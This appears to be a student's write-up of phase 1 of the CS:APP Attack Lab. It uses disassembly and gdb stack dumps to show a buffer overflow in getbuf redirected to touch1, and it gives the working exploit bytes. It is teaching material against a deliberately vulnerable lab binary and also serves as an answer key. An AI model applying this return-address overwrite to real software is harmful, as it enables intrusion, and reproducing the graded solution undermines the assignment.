# Attack Lab

## `hex2raw`

Converts whitespace separated digits representing byte values to raw bytes.

### Example

```shell
🐳 ❯ echo "30 31 32 33" | ./hex2raw | hexdump -v -e '/1 "%02x "' | awk '{for (i=1; i<=NF; i++) printf "%c", ("0x" $i)+0}'
0123
```

### Usage

```shell
🐳 ❯ ./hex2raw < exploit > exploit.bin
🐳 ❯ ./ctarget -q < exploit.bin
```

```shell
🐳 ❯ ./ctarget -qi exploit.bin
```

```shell
🐳 ❯ cat exploit | ./hex2raw | ./ctarget -q
```

Can also be used while running `GDB`

```shell
🐳 ❯ gdb ctarget
(gdb) run -q < exploit.bin
```

## Notes

- `ctarget` and `rtarget` must be run using the `-q` option so that they don't try to contact the grading server.

## Phase 1 (`ctarget`)

```shell
🐳 ❯ ./ctarget -qi exploit.phase1.bin
```

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp                   # Allocate 40 bytes on the stack
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp                    # 🎯 [TARGET]
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)
  4017cb:	00 00 00
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>

...

0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp                    # 👨‍💻 [START]
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	call   4017a8 <getbuf>              # push return address 0x401976 onto the stack
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	call   400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	ret
  401991:	90                   	nop
  401992:	90                   	nop
  401993:	90                   	nop
  401994:	90                   	nop
  401995:	90                   	nop
  401996:	90                   	nop
  401997:	90                   	nop
  401998:	90                   	nop
  401999:	90                   	nop
  40199a:	90                   	nop
  40199b:	90                   	nop
  40199c:	90                   	nop
  40199d:	90                   	nop
  40199e:	90                   	nop
  40199f:	90                   	nop
```

### Notes

Show state of stack after calling `getbuf` from `test`

- Can see return `test` return address `0x401976` at `0x5561dca0` on the stack

```shell
(gbd) break getbuf
(gdb) run -q
(gdb) display /12gx $rsp
2: x/12xg $rsp
0x5561dca0:     0x0000000000401976      0x0000000055685fe8
0x5561dcb0:     0x0000000000401f24      0x0000000000000000
0x5561dcc0:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dcd0:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dce0:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dcf0:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4

(gdb) x/2i $rip
=> 0x4017a8 <getbuf>:   sub    $0x28,%rsp
   0x4017ac <getbuf+4>: mov    %rsp,%rdi
(gdb) stepi
(gdb) x/12gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000055685fe8      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
(gdb) x/2i $rip
=> 0x4017ac <getbuf+4>: mov    %rsp,%rdi
   0x4017af <getbuf+7>: call   0x401a40 <Gets>
(gdb) nexti
(gdb) nexti
Type string:abcdefgh12345678123456781234567812345678ijklmnop
(gdb) x/12gx $rsp
0x5561dc78:     0x6867666564636261      0x3837363534333231
0x5561dc88:     0x3837363534333231      0x3837363534333231
0x5561dc98:     0x3837363534333231      0x706f6e6d6c6b6a69
0x5561dca8:     0x0000000055685f00      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```

Can overwrite the return address by supplying at least `0x28` bytes and then the desired new return address `0x4017c0`

- `0000000000000000000000000000000000000000` + `00000000004017c0`
- `0000000000401976` = `c0 17 40 00 00 00 00 00`
- Probably don't need to include the NULs can just provide the first 3 bytes to form the address

```shell
🐳 ❯ echo "c0 17 40" | ./hex2raw | hexdump -v -e '/1 "%02x "' | awk '{for (i=1; i<=NF; i++) printf "%c", ("0x" $i)+0}'
�@
```

- `73 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 65 c0 17 40`
- `szzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzze�@`
- Mark start `s` and end `e` of stack space allocated by `getbuf`

```shell
🐳 ❯ gdb ctarget
(gdb) break getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) run -q < exploit.phase1.bin
Starting program: /csapp/labs/attacklab/ctarget -q < exploit.phase1.bin
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12y
(gdb) x/5i $rip
=> 0x4017a8 <getbuf>:   sub    $0x28,%rsp
   0x4017ac <getbuf+4>: mov    %rsp,%rdi
   0x4017af <getbuf+7>: call   0x401a40 <Gets>
   0x4017b4 <getbuf+12>:        mov    $0x1,%eax
   0x4017b9 <getbuf+17>:        add    $0x28,%rsp
(gdb) nexti
14      in buf.c
(gdb) x/12gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000055685fe8      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
(gdb) nexti
0x00000000004017af      14      in buf.c
(gdb) nexti
16      in buf.c
(gdb) x/12gx $rsp
0x5561dc78:     0x7a7a7a7a7a7a7a73      0x7a7a7a7a7a7a7a7a
0x5561dc88:     0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x5561dc98:     0x657a7a7a7a7a7a7a      0x00000000004017c0
0x5561dca8:     0x0000000055685fe8      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4

(gdb) continue
Continuing.
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:73 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 65 C0 17 40
[Inferior 1 (process 3574) exited normally]
```
